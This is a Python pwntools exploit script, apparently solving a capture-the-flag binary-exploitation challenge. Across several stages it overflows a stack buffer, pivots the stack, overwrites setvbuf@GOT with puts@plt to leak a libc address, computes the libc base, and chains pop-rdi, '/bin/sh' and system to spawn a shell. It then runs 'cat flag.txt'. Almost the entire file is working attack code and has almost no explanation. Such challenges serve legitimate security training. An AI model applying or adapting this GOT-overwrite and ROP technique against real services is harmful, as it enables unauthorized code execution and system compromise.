#!/usr/bin/env python3
from pwn import *
import sys

if len(sys.argv) < 3:
    r = process(sys.argv[1])
else:
    r = remote(sys.argv[1], int(sys.argv[2]))
sleep(0.1)

_rbp = 0x404800
setvbuf = 0x4011b3
read = 0x401182 # from rbp-0x80
setvbuf_got = 0x404028
puts_plt = 0x401064
stdin_bss = 0x404050
read_got = 0x404020
r.recv().decode()

# Return to read
ans = b"A" * 0x80
offset = 0x80
ans += p64(setvbuf_got + 0x80 + 0x80)
ans += p64(read)
r.sendline(ans)

sleep(0.1)

# Write the saved rbp and return address to prepare the following writing
# (Write setvbuf@GOT to puts@plt next)
# Return to read
ans = p64(stdin_bss + 0x80)
ans += p64(read)
ans += b"A" * (stdin_bss - setvbuf_got - 8 * 2) # padding
ans += p64(_rbp - 8)
ans += p64(read)
ans += b"A" * (0x80 - (stdin_bss - setvbuf_got - 8 * 2) - 8 * 4) # padding
ans += p64(setvbuf_got + 0x80)
ans += p64(read)
r.sendline(ans)
sleep(0.1)

# Write puts@plt to setvbuf@GOT
# (Write read@GOT to stdin (variable) next)
# (Return to read)
ans = p64(puts_plt)
r.sendline(ans)
sleep(0.1)

# Write read@GOT to stdin (variable)
# (Move the next rbp to _rbp - 8)
# (Return to read)
ans = p64(read_got)
r.sendline(ans)
sleep(0.1)

# Move next rbp and rsp to _rbp
# Return to setvbuf (puts) 
# -> get read address
ans = b"A" * 0x80
ans += p64(_rbp)
ans += p64(setvbuf)
r.sendline(ans)

read_addr = u64(r.recvuntil(b'\n\x87(\xad\xfb', drop=True).ljust(8, b'\0'))
# print("libc read: ", hex(read_addr))
sleep(0.1)

r.recv().decode()
# Calculate libc base address
read_offset = 0x1147d0
libc_base = read_addr - read_offset
system_func = libc_base + 0x50d70
exit_func = libc_base + 0x455f0
pop_rdi = libc_base + 0x2a3e5
ret = libc_base + 0x29139
bin_sh = libc_base + 0x1d8678

# Pop "/bin/sh" to rdi
# Return to system 
# -> get the shell
# Return to exit
ans = b"A" * 0x80
ans += p64(_rbp)
# ans += p64(ret)
ans += p64(pop_rdi)
ans += p64(bin_sh)
ans += p64(system_func)
ans += p64(exit_func)
r.sendline(ans)
sleep(0.1)

r.sendline(b"cat flag.txt")
sleep(0.1)
print(r.recv().decode())
r.close()
